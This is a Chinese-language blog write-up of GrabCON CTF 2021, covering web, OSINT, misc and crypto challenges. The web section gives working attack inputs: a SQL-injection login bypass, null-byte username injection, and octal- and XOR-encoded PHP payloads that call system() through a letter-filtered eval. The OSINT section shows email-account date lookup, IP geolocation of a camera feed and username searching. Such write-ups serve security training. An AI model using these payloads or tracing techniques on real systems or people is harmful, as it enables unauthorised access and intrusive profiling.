---
title: "GrabCONCTF2021 Wp"
slug: "grabconctf2021-wp"
description: "唔 简单的wp 水一水"
date: 2021-09-07T11:22:14+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## Web/E4sy Pe4sy

> Hack admin user!
>
> Author: **r3curs1v3_pr0xy**

万能密码 `username=admin&password=%27%3D%27`

`GrabCON{E4sy_pe4sy_SQL_1nj3ct10n}`

## Web/Door Lock

> The door is open to all! See who is behind the admin door??
>
> Author: **r3curs1v3_pr0xy**

和上面那个一样的前端页面，但是很显然万能密码失效，随便登入一个号，有水平越权

![image-20210904212157898](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904212157898.png)

用burp跑一下

![image-20210906134840366](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906134840366.png)

`GrabCON{E4sy_1D0R_}`

## Web/Null Food Factory

> Prove your hacking skill to get admin panel.
>
> Author: **r3curs1v3_pr0xy**

还是一模一样的前端，目标还是以admin登入

用到的是Null byte injection，先以`admin%00`为用户名注册

![image-20210907105417519](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105417519.png)

然后用Admin的名字登入![image-20210907105241455](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105241455.png)

`GrabCON{Null_byt3s_1s_L0v3}`

## Web/Basic Calc

> Ever used calc based on php?
>
> Author: **karma**

```php
<?php

if (isset($_POST["eq"])){

    $eq = $_POST["eq"];

    if(preg_match("/[A-Za-z`]+/",$eq)){
        die("BAD.");
    }
    echo "Result: ";
    eval("echo " . $eq . " ;");
}else{
  echo highlight_file('index.php',true);
}

?>
```

现在看到php的题感觉那是相当的亲切了……

虽然是直接有了eval，但是这个正则过滤的有点狠，字母全被ban掉 就只能用xor或八进制的方式来把字母搞出来

八进制版本：

```
"\163\171\163\164\145\155"("\154\163")
// "system"("ls")
"\163\171\163\164\145\155"("\143\141\164\40\57\146\154\141\147\147\147\147\56\164\170\164")
// "system("cat /flagggg.txt")"
```

xor

```
Ouput:
("system")("cat /flagggg.txt") = (('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@'))
```

![image-20210907111823056](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907111823056.png)

`GrabCON{b4by_php_f0r_y0u}`

参考： https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/  |  https://ctf.0xff.re/2021/uiuctf_2021/phpfuck  |  https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md  |  https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264

## OSINT/ProtonDate

> Can you find the date, when was this email created?
>
> sc4ry_gh0st@protonmail[dot]com
>
> GrabCON{dd_mm_yyyy}
>
> Author: **CETACEAN**

说实话 是纯猜的

`GrabCON{03_09_2021}`

但是看了wp之后发现这确实有正规的做法，一个开源工具叫[ProtOSINT](https://github.com/pixelbubble/ProtOSINT)，所使用的api如下

```
https://api.protonmail.ch/pks/lookup?op=index&search=sc4ry_gh0st@protonmail.com
```

![image-20210906131321553](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906131321553.png)拿到时间戳1630658267，即Fri 3 September 2021 08:37:47 UTC

## OSINT/Victim 1

> We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?
>
> [Live Camera](http://31.207.115.133:8080/cgi-bin/faststream.jpg?stream=half&fps=15&rand=COUNTER)
>
> GrabCON{zipcode}
>
> Author: **CETACEAN**

给了一个摄像头的地址，用[IP geolocation lookup](https://www.iplocation.net/ip-lookup)查一下地点

![image-20210906210732263](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906210732263.png)

画面右上有个在动的缆车

![image-20210906211008725](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211008725.png)

zipcode: 39031

`GrabCON{39031}`

## OSINT/Website

> My friend is having a website named, "Great Animals Here". He have leaked the flag on his website. Can you find the flag?
>
> Hint: He used free website builder tool to create his site. greatanimalshere
>
> Author: **CETACEAN**

https://greatanimalshere.weebly.com/

![image-20210907101731335](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101731335.png)

## OSINT/The Tour(1)

> w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?
>
> Author : **rey**

![image-20210906211622007](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211622007.png)

空的，试一下wayback machine

```
https://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/
```

也是空的，用[sherlock](https://github.com/sherlock-project/sherlock)查一下

![image-20210906214255872](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906214255872.png)

后面的内容可以[详见wp](https://kashmir54.github.io/ctfs/GrabCON/#the-tour1)了，很少做OSINT，但是感觉好有意思，就是找的好麻烦，脑洞好大，不容易啊

## OSINT/The Tour(2)

> Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}
>
> Author : **rey**

wp->https://kashmir54.github.io/ctfs/GrabCON/#the-tour2

## Misc/Welcome

> GrabCON{welcome_to_grabcon_2021}

`GrabCON{welcome_to_grabcon_2021}`

## Misc/Discord

> Join our [discord](https://discord.gg/8F9VMVCWb2) server!

憨批机器人，我没搞明白这个是怎么玩的

![image-20210905092539802](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905092539802.png)

tmd 试了好久 结果竟然在#role

![image-20210906121117043](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906121117043.png)

`GrabCON{s@n1ty_fl4g_1s_here}`

fxxxk

## Misc/YouTube

> Find us on YouTube.

`GrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}`

## Misc/Find me

> Checkout author's social media.
>
> Author: **Offen5ive**

![image-20210905103746359](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905103746359.png)

![image-20210907101222360](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101222360.png)

`GrabCON{n0_fl4g_h3r3}`

## Crypto/Warm-up

> Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.
>
> Author: **Offen5ive**

```
file:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)&input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVVMGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K
```

全部是b64加密 很简单了

`GrabCON{dayuum_s0n!}`

------

好菜好菜，开学了 奥里给